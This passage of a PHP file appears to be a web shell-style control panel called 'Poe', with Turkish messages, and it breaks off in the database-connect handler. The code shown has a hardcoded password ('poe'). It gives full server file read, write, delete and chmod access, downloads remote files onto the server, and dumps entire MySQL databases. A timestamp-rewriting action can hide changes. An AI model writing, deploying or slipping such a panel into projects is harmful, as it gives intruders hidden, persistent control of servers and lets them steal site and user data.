<?php

error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE & ~E_WARNING);
ini_set('display_errors', '0');
session_start();

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $b = openssl_random_pseudo_bytes($length);
            if ($b !== false) return $b;
        }
        $bytes = '';
        for ($i = 0; $i < $length; $i++) $bytes .= chr(mt_rand(0, 255));
        return $bytes;
    }
}

$GLOBALS['__poe_ajax_active'] = false;
register_shutdown_function(function () {
    if (empty($GLOBALS['__poe_ajax_active'])) return;
    $err = error_get_last();
    if ($err && in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR], true)) {
        if (!headers_sent()) header('Content-Type: application/json; charset=utf-8');
        echo json_encode(['ok' => false, 'error' => 'Sunucuda beklenmeyen bir hata oluştu: ' . $err['message']]);
    }
});

define('PANEL_PASSWORD', 'poe');
define('PANEL_NAME', 'Poe');
define('START_DIR', rtrim(realpath(__DIR__), '/') ?: '/');
define('SESSION_KEY', 'poe_panel_authenticated');
define('MAX_EDIT_BYTES', 6 * 1024 * 1024);
define('MAX_LOGIN_ATTEMPTS', 5);
define('LOGIN_LOCKOUT_SECONDS', 60);

@ini_set('memory_limit', '512M');
@set_time_limit(0);

function isLoggedIn() { return !empty($_SESSION[SESSION_KEY]); }

function jres($data) {
    header('Content-Type: application/json; charset=utf-8');
    $flags = 0;
    if (defined('JSON_PARTIAL_OUTPUT_ON_ERROR')) $flags |= JSON_PARTIAL_OUTPUT_ON_ERROR;
    if (defined('JSON_INVALID_UTF8_SUBSTITUTE')) $flags |= JSON_INVALID_UTF8_SUBSTITUTE;
    $out = json_encode($data, $flags);
    if ($out === false) {
        $out = json_encode(['ok' => false, 'error' => 'Sunucu yanıtı JSON\'a çevrilemedi: ' . json_last_error_msg()]);
    }
    echo $out;
    exit;
}
function jok($extra = []) { jres(array_merge(['ok' => true], $extra)); }
function jerr($msg, $code = 400) { http_response_code($code); jres(['ok' => false, 'error' => $msg]); }

function requireAuth() {
    if (!isLoggedIn()) jerr('Oturum sona erdi, lütfen tekrar giriş yapın.', 401);
    $sent = isset($_POST['csrf']) ? $_POST['csrf'] : (isset($_GET['csrf']) ? $_GET['csrf'] : '');
    if (!hash_equals((isset($_SESSION['csrf']) ? $_SESSION['csrf'] : ''), (string)$sent)) {
        jerr('Geçersiz güvenlik anahtarı (CSRF). Sayfayı yenileyip tekrar deneyin.', 403);
    }
}

function safePath($path) {
    if ($path === '' || $path === null) $path = START_DIR;
    if (strpos((string)$path, "\0") !== false) return false;
    if ($path[0] !== '/') $path = '/' . ltrim($path, '/');
    $real = realpath($path);
    if ($real !== false) return $real;
    $dir = realpath(dirname($path));
    if ($dir === false) return false;
    return $path;
}

function joinP($dir, $name) { return $dir === '/' ? '/' . $name : $dir . '/' . $name; }

function suggestZipName($names) {
    if (count($names) === 1) {
        return $names[0] . '.zip';
    }
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'arsiv';
    $safe = preg_replace('/[^A-Za-z0-9_.\-]+/', '_', $host);
    if ($safe === '') $safe = 'arsiv';
    return $safe . '.zip';
}

function normalizeDomain($input) {
    $input = trim($input);
    $input = preg_replace('#^https?://#i', '', $input);
    $input = preg_replace('#/.*$#', '', $input);
    $input = preg_replace('#:\d+$#', '', $input);
    return $input;
}

function whoisQuery($domain, $server = 'whois.iana.org', $depth = 0) {
    if ($depth > 3) return '';
    $fp = @fsockopen($server, 43, $errno, $errstr, 8);
    if (!$fp) return '';
    fwrite($fp, $domain . "\r\n");
    $response = '';
    while (!feof($fp)) $response .= fgets($fp, 1024);
    fclose($fp);
    if (preg_match('/refer:\s*(\S+)/i', $response, $m)) {
        $refined = whoisQuery($domain, trim($m[1]), $depth + 1);
        if ($refined) return $refined;
    }
    if (preg_match('/Whois Server:\s*(\S+)/i', $response, $m) && trim($m[1]) !== $server) {
        $refined = whoisQuery($domain, trim($m[1]), $depth + 1);
        if ($refined) return $refined;
    }
    return $response;
}

function humanSize($bytes) {
    if ($bytes === null) return '';
    if ($bytes <= 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = (int)floor(log($bytes, 1024));
    $i = min($i, count($units) - 1);
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function isTextFile($path) {
    $textExt = ['txt','md','php','php3','php4','php5','phtml','html','htm','css','js','json','xml','yml','yaml',
        'ini','conf','config','sh','bash','sql','py','rb','java','c','cpp','h','hpp','go','rs','ts','tsx','jsx',
        'vue','env','htaccess','htpasswd','log','csv','gitignore','twig','blade','lock','toml','svg'];
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    if (in_array($ext, $textExt, true)) return true;
    if (basename($path)[0] === '.' && $ext === '') return true;
    if (!is_file($path)) return false;
    $fh = @fopen($path, 'rb');
    if (!$fh) return false;
    $chunk = fread($fh, 8000);
    fclose($fh);
    if ($chunk === false) return false;
    return strpos($chunk, "\0") === false;
}

function fileIconKey($path, $isDir) {
    if ($isDir) return 'folder';
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $map = [
        'jpg'=>'image','jpeg'=>'image','png'=>'image','gif'=>'image','svg'=>'image','webp'=>'image','ico'=>'image','bmp'=>'image',
        'zip'=>'archive','rar'=>'archive','tar'=>'archive','gz'=>'archive','7z'=>'archive',
        'php'=>'code','js'=>'code','ts'=>'code','py'=>'code','html'=>'code','htm'=>'code','css'=>'code','json'=>'code','sql'=>'code','sh'=>'code','xml'=>'code','java'=>'code','c'=>'code','cpp'=>'code','go'=>'code','rb'=>'code','jsx'=>'code','tsx'=>'code','vue'=>'code',
        'pdf'=>'pdf',
        'doc'=>'doc','docx'=>'doc','odt'=>'doc','txt'=>'doc','md'=>'doc',
        'xls'=>'sheet','xlsx'=>'sheet','csv'=>'sheet',
        'mp4'=>'video','mkv'=>'video','avi'=>'video','mov'=>'video','webm'=>'video',
        'mp3'=>'audio','wav'=>'audio','ogg'=>'audio','flac'=>'audio',
    ];
    return (isset($map[$ext]) ? $map[$ext] : 'file');
}

function rrmdir($dir) {
    if (!is_dir($dir) || is_link($dir)) { @unlink($dir); return; }
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dir . '/' . $item;
        if (is_dir($p) && !is_link($p)) rrmdir($p);
        else @unlink($p);
    }
    @rmdir($dir);
}

function copyRecursive($src, $dst) {
    if (is_link($src)) { @symlink(readlink($src), $dst); return; }
    if (is_dir($src)) {
        @mkdir($dst, 0755, true);
        foreach (scandir($src) as $item) {
            if ($item === '.' || $item === '..') continue;
            copyRecursive($src . '/' . $item, $dst . '/' . $item);
        }
    } else {
        @copy($src, $dst);
    }
}

function addFolderToZip($zip, $folder, $base) {
    $folder = rtrim($folder, '/');
    $zip->addEmptyDir(ltrim(str_replace($base, '', $folder), '/'));
    $items = scandir($folder);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $folder . '/' . $item;
        $localPath = ltrim(str_replace($base, '', $path), '/');
        if (is_dir($path)) addFolderToZip($zip, $path, $base);
        else $zip->addFile($path, $localPath);
    }
}

function tmpZipDir() {
    $dir = sys_get_temp_dir() . '/poe_panel_zips';
    if (!is_dir($dir)) @mkdir($dir, 0700, true);
    return $dir;
}

function dbConn($connId = null) {
    if ($connId === null) {
        $connId = isset($_POST['connId']) ? $_POST['connId'] : (isset($_GET['connId']) ? $_GET['connId'] : null);
    }
    if (!$connId || empty($_SESSION['db_connections'][$connId])) return null;
    $d = $_SESSION['db_connections'][$connId];
    mysqli_report(MYSQLI_REPORT_OFF);
    $conn = @mysqli_connect($d['host'], $d['user'], $d['pass'], $d['name'] !== '' ? $d['name'] : null, (int)$d['port']);
    if ($conn) {
        if (!@mysqli_set_charset($conn, 'utf8mb4')) @mysqli_set_charset($conn, 'utf8');
    }
    return $conn ?: null;
}

if (isset($_POST['do_login'])) {
    if (!empty($_SESSION['login_lock_until']) && time() < $_SESSION['login_lock_until']) {
        $remaining = $_SESSION['login_lock_until'] - time();
        $_SESSION['login_error'] = 'Çok fazla hatalı deneme. Lütfen ' . $remaining . ' saniye sonra tekrar deneyin.';
    } elseif (hash_equals(PANEL_PASSWORD, (isset($_POST['password']) ? $_POST['password'] : ''))) {
        session_regenerate_id(true);
        $_SESSION[SESSION_KEY] = true;
        $_SESSION['csrf'] = bin2hex(random_bytes(24));
        unset($_SESSION['login_attempts'], $_SESSION['login_lock_until']);
    } else {
        $_SESSION['login_attempts'] = ((isset($_SESSION['login_attempts']) ? $_SESSION['login_attempts'] : 0)) + 1;
        if ($_SESSION['login_attempts'] >= MAX_LOGIN_ATTEMPTS) {
            $_SESSION['login_lock_until'] = time() + LOGIN_LOCKOUT_SECONDS;
            $_SESSION['login_error'] = 'Çok fazla hatalı deneme. ' . LOGIN_LOCKOUT_SECONDS . ' saniye sonra tekrar deneyin.';
        } else {
            $_SESSION['login_error'] = 'Şifre hatalı. (' . $_SESSION['login_attempts'] . '/' . MAX_LOGIN_ATTEMPTS . ' deneme)';
        }
    }
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

if (isLoggedIn() && isset($_GET['stream'])) {
    $token = (isset($_GET['csrf']) ? $_GET['csrf'] : '');
    if (!hash_equals((isset($_SESSION['csrf']) ? $_SESSION['csrf'] : ''), (string)$token)) { http_response_code(403); exit('Geçersiz istek.'); }

    if ($_GET['stream'] === 'file') {
        $path = safePath((isset($_GET['path']) ? $_GET['path'] : ''));
        if (!$path || !is_file($path)) { http_response_code(404); exit('Dosya bulunamadı.'); }
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . filesize($path));
        header('X-Content-Type-Options: nosniff');
        readfile($path);
        exit;
    }

    if ($_GET['stream'] === 'preview') {
        $path = safePath((isset($_GET['path']) ? $_GET['path'] : ''));
        if (!$path || !is_file($path)) { http_response_code(404); exit('Dosya bulunamadı.'); }
        $mime = 'application/octet-stream';
        if (function_exists('finfo_open')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime = finfo_file($finfo, $path) ?: $mime;
            finfo_close($finfo);
        }
        $size = filesize($path);
        header('Content-Type: ' . $mime);
        header('Content-Disposition: inline; filename="' . basename($path) . '"');
        header('Accept-Ranges: bytes');

        $start = 0; $end = $size - 1;
        $isRange = false;
        if (isset($_SERVER['HTTP_RANGE']) && preg_match('/bytes=(\d*)-(\d*)/', $_SERVER['HTTP_RANGE'], $m)) {
            $isRange = true;
            if ($m[1] !== '') $start = (int)$m[1];
            if ($m[2] !== '') $end = (int)$m[2];
            if ($end > $size - 1) $end = $size - 1;
            if ($start > $end) { $start = 0; $end = $size - 1; $isRange = false; }
        }
        $length = $end - $start + 1;
        if ($isRange) {
            http_response_code(206);
            header('Content-Range: bytes ' . $start . '-' . $end . '/' . $size);
        }
        header('Content-Length: ' . $length);

        $fp = @fopen($path, 'rb');
        if (!$fp) { http_response_code(500); exit('Dosya açılamadı.'); }
        fseek($fp, $start);
        $bufferSize = 8192;
        $remaining = $length;
        while ($remaining > 0 && !feof($fp)) {
            $read = $remaining < $bufferSize ? $remaining : $bufferSize;
            echo fread($fp, $read);
            flush();
            $remaining -= $read;
        }
        fclose($fp);
        exit;
    }

    if ($_GET['stream'] === 'zip') {
        $token2 = (isset($_GET['token']) ? $_GET['token'] : '');
        $zipPath = tmpZipDir() . '/' . basename($token2) . '.zip';
        if (!preg_match('/^[a-f0-9]+$/', $token2) || !is_file($zipPath)) { http_response_code(404); exit('Zip bulunamadı veya süresi doldu.'); }
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . ((isset($_GET['name']) ? $_GET['name'] : 'arsiv.zip')) . '"');
        header('Content-Length: ' . filesize($zipPath));
        readfile($zipPath);
        @unlink($zipPath);
        exit;
    }

    if ($_GET['stream'] === 'dbexport') {
        $connId = (isset($_GET['connId']) ? $_GET['connId'] : '');
        $conn = dbConn($connId);
        if (!$conn) { http_response_code(400); exit('Veritabanı bağlantısı yok.'); }
        $table = (isset($_GET['table']) ? $_GET['table'] : '');
        $dbUser = (isset($_SESSION['db_connections'][$connId]['user']) && $_SESSION['db_connections'][$connId]['user'] !== '') ? $_SESSION['db_connections'][$connId]['user'] : 'export';
        $dbUser = preg_replace('/[^A-Za-z0-9_.\-]+/', '_', $dbUser);
        $fname = $table ? $table . '.sql' : $dbUser . '.sql';
        header('Content-Type: application/sql');
        header('Content-Disposition: attachment; filename="' . $fname . '"');
        echo "-- Poe Panel Veritabani Disa Aktarma\n-- Tarih: " . date('Y-m-d H:i:s') . "\n\n";
        echo "SET FOREIGN_KEY_CHECKS=0;\n\n";
        $tables = [];
        if ($table) { $tables[] = $table; }
        else { $res = mysqli_query($conn, 'SHOW TABLES'); while ($row = mysqli_fetch_array($res)) $tables[] = $row[0]; }
        foreach ($tables as $t) {
            $tEsc = mysqli_real_escape_string($conn, $t);
            $createRes = mysqli_query($conn, "SHOW CREATE TABLE `$tEsc`");
            $createRow = mysqli_fetch_array($createRes);
            echo "DROP TABLE IF EXISTS `$t`;\n" . $createRow[1] . ";\n\n";
            $dataRes = mysqli_query($conn, "SELECT * FROM `$tEsc`");
            $cols = mysqli_fetch_fields($dataRes);
            while ($row = mysqli_fetch_assoc($dataRes)) {
                $vals = [];
                foreach ($cols as $c) {
                    $v = $row[$c->name];
                    $vals[] = $v === null ? 'NULL' : "'" . mysqli_real_escape_string($conn, $v) . "'";
                }
                echo "INSERT INTO `$t` VALUES (" . implode(', ', $vals) . ");\n";
            }
            echo "\n";
        }
        echo "SET FOREIGN_KEY_CHECKS=1;\n";
        exit;
    }

    if ($_GET['stream'] === 'phpinfo') {
        ob_start();
        phpinfo();
        $html = ob_get_clean();
        echo $html;
        exit;
    }
}

if (isset($_REQUEST['action'])) {
    $GLOBALS['__poe_ajax_active'] = true;
    $action = $_REQUEST['action'];

    if ($action === 'login_check') jok(['logged' => isLoggedIn()]);

    requireAuth();

    switch ($action) {


        case 'fm_list': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            if (!$path || !is_dir($path)) jerr('Dizin bulunamadı ya da erişim izniniz yok.');
            $items = [];
            $dh = @scandir($path);
            if ($dh === false) jerr('Dizin okunamadı (izin sorunu olabilir).');
            $selfPath = realpath(__FILE__);
            foreach ($dh as $item) {
                if ($item === '.' || $item === '..') continue;
                $full = $path . '/' . $item;
                $isDir = is_dir($full) && !is_link($full);
                $items[] = [
                    'name' => $item,
                    'isDir' => $isDir,
                    'isLink' => is_link($full),
                    'isSelf' => ($selfPath !== false && $full === $selfPath),
                    'size' => $isDir ? null : @filesize($full),
                    'sizeH' => $isDir ? '' : humanSize(@filesize($full)),
                    'modified' => date('Y-m-d H:i', @filemtime($full) ?: time()),
                    'created' => date('Y-m-d H:i', @filectime($full) ?: time()),
                    'perms' => substr(sprintf('%o', @fileperms($full)), -4),
                    'icon' => fileIconKey($full, $isDir),
                    'writable' => is_writable($full),
                ];
            }
            usort($items, function($a, $b) {
                if ($a['isDir'] !== $b['isDir']) return $a['isDir'] ? -1 : 1;
                return strcasecmp($a['name'], $b['name']);
            });
            $rel = ltrim($path, '/');
            jok(['items' => $items, 'path' => $path, 'relPath' => $rel]);
        }

        case 'fm_mkdir': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $name = trim((isset($_POST['name']) ? $_POST['name'] : ''));
            if (!$path || $name === '' || strpbrk($name, '/\\') !== false) jerr('Geçersiz klasör adı.');
            $target = joinP($path, $name);
            if (file_exists($target)) jerr('Bu isimde bir öğe zaten var.');
            if (!@mkdir($target, 0755)) jerr('Klasör oluşturulamadı (izin sorunu olabilir).');
            jok();
        }

        case 'fm_mkfile': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $name = trim((isset($_POST['name']) ? $_POST['name'] : ''));
            if (!$path || $name === '' || strpbrk($name, '/\\') !== false) jerr('Geçersiz dosya adı.');
            $target = joinP($path, $name);
            if (file_exists($target)) jerr('Bu isimde bir öğe zaten var.');
            if (@file_put_contents($target, '') === false) jerr('Dosya oluşturulamadı (izin sorunu olabilir).');
            jok();
        }

        case 'fm_rename': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $old = (isset($_POST['old']) ? $_POST['old'] : '');
            $new = trim((isset($_POST['new']) ? $_POST['new'] : ''));
            if (!$path || $old === '' || $new === '' || strpbrk($new, '/\\') !== false) jerr('Geçersiz istek.');
            $oldFull = safePath(joinP($path, $old));
            $newFull = joinP($path, $new);
            if (!$oldFull || !file_exists($oldFull)) jerr('Kaynak bulunamadı.');
            if (file_exists($newFull)) jerr('Bu isimde bir öğe zaten var.');
            if (!@rename($oldFull, $newFull)) jerr('Yeniden adlandırma başarısız (izin sorunu olabilir).');
            jok();
        }

        case 'fm_delete': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $names = json_decode((isset($_POST['items']) ? $_POST['items'] : '[]'), true) ?: [];
            if (!$path || !$names) jerr('Silinecek öğe seçilmedi.');
            $failed = [];
            foreach ($names as $n) {
                $full = safePath(joinP($path, $n));
                clearstatcache(true, (string)$full);
                if (!$full || !file_exists($full)) { $failed[] = $n; continue; }
                if (is_dir($full) && !is_link($full)) rrmdir($full);
                else @unlink($full);
                clearstatcache(true, $full);
                if (file_exists($full)) $failed[] = $n;
            }
            if ($failed) jerr('Bazı öğeler silinemedi (izin sorunu olabilir): ' . implode(', ', $failed));
            jok();
        }

        case 'fm_read': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $file = (isset($_POST['file']) ? $_POST['file'] : '');
            $full = safePath(joinP($path ?: START_DIR, $file));
            clearstatcache(true, (string)$full);
            if (!$full || !is_file($full)) jerr('Dosya bulunamadı.');
            if (filesize($full) > MAX_EDIT_BYTES) jerr('Dosya çok büyük, düzenlenemiyor (6MB üzeri).');
            if (!isTextFile($full)) jerr('Bu dosya türü metin editöründe açılamaz.');
            jok(['content' => base64_encode(file_get_contents($full))]);
        }

        case 'fm_save': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $file = (isset($_POST['file']) ? $_POST['file'] : '');
            $contentB64 = (isset($_POST['content']) ? $_POST['content'] : '');
            $content = base64_decode($contentB64, true);
            if ($content === false) jerr('İçerik çözümlenemedi.');
            $full = safePath(joinP($path ?: START_DIR, $file));
            if (!$full) jerr('Geçersiz yol.');
            if (@file_put_contents($full, $content) === false) jerr('Kaydedilemedi (izin sorunu olabilir).');
            clearstatcache(true, $full);
            if (function_exists('opcache_invalidate')) @opcache_invalidate($full, true);
            jok();
        }

        case 'fm_chmod': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $file = (isset($_POST['file']) ? $_POST['file'] : '');
            $perm = (isset($_POST['perm']) ? $_POST['perm'] : '');
            $full = safePath(joinP($path ?: START_DIR, $file));
            if (!$full || !file_exists($full) || !preg_match('/^[0-7]{3,4}$/', $perm)) jerr('Geçersiz istek.');
            if (!@chmod($full, octdec($perm))) jerr('İzinler değiştirilemedi (izin sorunu olabilir).');
            jok();
        }

        case 'fm_touch': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $file = (isset($_POST['file']) ? $_POST['file'] : '');
            $date = (isset($_POST['date']) ? $_POST['date'] : '');
            $full = safePath(joinP($path ?: START_DIR, $file));
            if (!$full || !file_exists($full)) jerr('Dosya/klasör bulunamadı.');
            $ts = strtotime($date);
            if ($ts === false) jerr('Geçersiz tarih/saat formatı.');
            if (!@touch($full, $ts, $ts)) jerr('Tarih değiştirilemedi (izin sorunu olabilir).');
            clearstatcache(true, $full);
            jok(['mtime' => date('Y-m-d H:i', $ts)]);
        }

        case 'fm_info': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $file = (isset($_POST['file']) ? $_POST['file'] : '');
            $full = safePath(joinP($path ?: START_DIR, $file));
            if (!$full || !file_exists($full)) jerr('Bulunamadı.');
            clearstatcache(true, $full);
            $stat = @stat($full);
            $owner = (isset($stat['uid']) ? $stat['uid'] : '-');
            $group = (isset($stat['gid']) ? $stat['gid'] : '-');
            if (function_exists('posix_getpwuid') && isset($stat['uid'])) {
                $pw = @posix_getpwuid($stat['uid']);
                if ($pw) $owner = $pw['name'];
            }
            if (function_exists('posix_getgrgid') && isset($stat['gid'])) {
                $gr = @posix_getgrgid($stat['gid']);
                if ($gr) $group = $gr['name'];
            }
            $mime = null;
            if (is_file($full) && function_exists('finfo_open')) {
                $finfo = finfo_open(FILEINFO_MIME_TYPE);
                $mime = finfo_file($finfo, $full);
                finfo_close($finfo);
            }
            jok([
                'path' => $full,
                'isDir' => is_dir($full),
                'isLink' => is_link($full),
                'linkTarget' => is_link($full) ? readlink($full) : null,
                'size' => is_dir($full) ? null : filesize($full),
                'sizeH' => is_dir($full) ? null : humanSize(filesize($full)),
                'perms' => substr(sprintf('%o', fileperms($full)), -4),
                'owner' => $owner, 'group' => $group,
                'mtime' => date('Y-m-d H:i:s', $stat['mtime']),
                'atime' => date('Y-m-d H:i:s', $stat['atime']),
                'ctime' => date('Y-m-d H:i:s', $stat['ctime']),
                'mime' => $mime,
            ]);
        }

        case 'fm_upload': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            if (!$path || !is_dir($path)) jerr('Hedef dizin bulunamadı.');
            if (empty($_FILES['files'])) jerr('Dosya seçilmedi.');
            $uploaded = []; $errors = [];
            $files = $_FILES['files'];
            $count = is_array($files['name']) ? count($files['name']) : 0;
            for ($i = 0; $i < $count; $i++) {
                if ($files['error'][$i] !== UPLOAD_ERR_OK) { $errors[] = $files['name'][$i]; continue; }
                $safeName = basename($files['name'][$i]);
                $target = joinP($path, $safeName);
                if (@move_uploaded_file($files['tmp_name'][$i], $target)) {
                    $uploaded[] = [
                        'name' => $safeName,
                        'path' => $target,
                        'size' => @filesize($target),
                        'sizeH' => humanSize(@filesize($target)),
                    ];
                } else {
                    $errors[] = $files['name'][$i];
                }
            }
            jok(['uploaded' => $uploaded, 'errors' => $errors]);
        }

        case 'fm_upload_url': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $url = trim((isset($_POST['url']) ? $_POST['url'] : ''));
            $filename = trim((isset($_POST['filename']) ? $_POST['filename'] : ''));
            if (!$path || !is_dir($path)) jerr('Hedef dizin bulunamadı.');
            if (!filter_var($url, FILTER_VALIDATE_URL)) jerr('Geçersiz URL.');
            $scheme = parse_url($url, PHP_URL_SCHEME);
            if (!in_array($scheme, ['http', 'https'], true)) jerr('Yalnızca http/https adresleri desteklenir.');
            if ($filename === '') {
                $parsedPath = parse_url($url, PHP_URL_PATH);
                $filename = basename($parsedPath !== null ? $parsedPath : '');
                if ($filename === '' || $filename === '/') $filename = 'indirilen_dosya';
            }
            $filename = basename($filename);
            $target = joinP($path, $filename);
            if (function_exists('curl_init')) {
                $fp = @fopen($target, 'wb');
                if (!$fp) jerr('Hedefe yazılamıyor (izin sorunu olabilir).');
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_FILE, $fp);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
                curl_setopt($ch, CURLOPT_TIMEOUT, 120);
                curl_setopt($ch, CURLOPT_USERAGENT, 'PoePanel/1.0');
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
                $ok = curl_exec($ch);
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $err = curl_error($ch);
                curl_close($ch);
                fclose($fp);
                if (!$ok || $code >= 400) { @unlink($target); jerr('İndirme başarısız: ' . ($err ?: ('HTTP ' . $code))); }
            } else {
                $ctx = stream_context_create(['http' => ['timeout' => 120], 'https' => ['timeout' => 120]]);
                $data = @file_get_contents($url, false, $ctx);
                if ($data === false) jerr('İndirme başarısız (sunucuda cURL yok, alternatif yöntem de başarısız oldu).');
                @file_put_contents($target, $data);
            }
            clearstatcache();
            jok(['filename' => $filename, 'size' => humanSize(@filesize($target))]);
        }

        case 'fm_paste': {
            $pathFrom = safePath((isset($_POST['pathFrom']) ? $_POST['pathFrom'] : ''));
            $pathTo = safePath((isset($_POST['pathTo']) ? $_POST['pathTo'] : ''));
            $mode = (isset($_POST['mode']) ? $_POST['mode'] : 'copy');
            $names = json_decode((isset($_POST['items']) ? $_POST['items'] : '[]'), true) ?: [];
            if (!$pathFrom || !$pathTo || !$names) jerr('Geçersiz istek.');
            $skipped = [];
            foreach ($names as $n) {
                $src = safePath(joinP($pathFrom, $n));
                if (!$src || !file_exists($src)) { $skipped[] = $n; continue; }
                $dst = joinP($pathTo, $n);
                if (file_exists($dst)) { $skipped[] = $n . ' (zaten var)'; continue; }
                if ($mode === 'cut') {
                    if (!@rename($src, $dst)) {
                        copyRecursive($src, $dst);
                        if (is_dir($src) && !is_link($src)) rrmdir($src); else @unlink($src);
                    }
                } else {
                    copyRecursive($src, $dst);
                }
            }
            jok(['skipped' => $skipped]);
        }

        case 'fm_duplicate': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $name = (isset($_POST['name']) ? $_POST['name'] : '');
            $src = safePath(joinP($path ?: START_DIR, $name));
            if (!$src || !file_exists($src)) jerr('Kaynak bulunamadı.');
            $info = pathinfo($name);
            $base = (isset($info['filename']) ? $info['filename'] : $name);
            $ext = isset($info['extension']) && $info['extension'] !== '' ? '.' . $info['extension'] : '';
            $newName = $base . '_kopya' . $ext;
            $i = 2;
            while (file_exists(joinP($path, $newName))) { $newName = $base . '_kopya' . $i . $ext; $i++; }
            copyRecursive($src, joinP($path, $newName));
            jok(['name' => $newName]);
        }

        case 'fm_zip': {
            if (!class_exists('ZipArchive')) jerr('Sunucuda PHP ZIP eklentisi kurulu değil.');
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $names = json_decode((isset($_POST['items']) ? $_POST['items'] : '[]'), true) ?: [];
            if (!$path || !$names) jerr('Sıkıştırılacak öğe seçilmedi.');
            $token = bin2hex(random_bytes(16));
            $zipPath = tmpZipDir() . '/' . $token . '.zip';
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE) !== true) jerr('Zip oluşturulamadı.');
            foreach ($names as $n) {
                $full = safePath(joinP($path, $n));
                if (!$full || !file_exists($full)) continue;
                if (is_dir($full)) addFolderToZip($zip, $full, $path);
                else $zip->addFile($full, $n);
            }
            $zip->close();
            jok(['token' => $token, 'suggestedName' => suggestZipName($names)]);
        }

        case 'fm_zip_server': {
            if (!class_exists('ZipArchive')) jerr('Sunucuda PHP ZIP eklentisi kurulu değil.');
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $names = json_decode((isset($_POST['items']) ? $_POST['items'] : '[]'), true) ?: [];
            if (!$path || !$names) jerr('Sıkıştırılacak öğe seçilmedi.');
            $zipName = suggestZipName($names);
            $target = joinP($path, $zipName);
            $n = 1;
            while (file_exists($target)) {
                $zipName = preg_replace('/\.zip$/', '', suggestZipName($names)) . '-' . $n . '.zip';
                $target = joinP($path, $zipName);
                $n++;
            }
            $zip = new ZipArchive();
            if ($zip->open($target, ZipArchive::CREATE) !== true) jerr('Zip oluşturulamadı (izin sorunu olabilir).');
            foreach ($names as $nm) {
                $full = safePath(joinP($path, $nm));
                if (!$full || !file_exists($full)) continue;
                if (is_dir($full)) addFolderToZip($zip, $full, $path);
                else $zip->addFile($full, $nm);
            }
            $zip->close();
            jok(['name' => $zipName]);
        }

        case 'fm_unzip': {
            if (!class_exists('ZipArchive')) jerr('Sunucuda PHP ZIP eklentisi kurulu değil.');
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $file = (isset($_POST['file']) ? $_POST['file'] : '');
            $full = safePath(joinP($path ?: START_DIR, $file));
            if (!$full || !is_file($full)) jerr('Arşiv bulunamadı.');
            $zip = new ZipArchive();
            if ($zip->open($full) !== true) jerr('Arşiv açılamadı.');
            $dest = joinP($path, pathinfo($file, PATHINFO_FILENAME));
            if (!is_dir($dest)) @mkdir($dest, 0755, true);
            $zip->extractTo($dest);
            $zip->close();
            jok();
        }

        case 'fm_search': {
            $path = safePath((isset($_POST['path']) ? $_POST['path'] : ''));
            $q = trim((isset($_POST['q']) ? $_POST['q'] : ''));
            if (!$path || $q === '') jerr('Arama terimi giriniz.');
            $results = [];
            $it = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            $c = 0;
            foreach ($it as $f) {
                if ($c >= 500) break;
                if (stripos($f->getFilename(), $q) !== false) {
                    $results[] = [
                        'name' => $f->getFilename(),
                        'path' => $f->getPathname(),
                        'isDir' => $f->isDir(),
                        'icon' => fileIconKey($f->getPathname(), $f->isDir()),
                    ];
                    $c++;
                }
            }
            jok(['items' => $results]);
        }


        case 'db_connect': {
            $host = trim((isset($_POST['host']) ? $_POST['host'] : 'localhost'));
            $user = trim((isset($_POST['user']) ? $_POST['user'] : ''));
            $pass = (isset($_POST['pass']) ? $_POST['pass'] : '');
            $name = trim((isset($_POST['name']) ? $_POST['name'] : ''));
            $port = (int)((isset($_POST['port']) ? $_POST['port'] : 3306));
            mysqli_report(MYSQLI_REPORT_OFF);
            $conn = @mysqli_connect($host, $user, $pass, $name !== '' ? $name : null, $port);
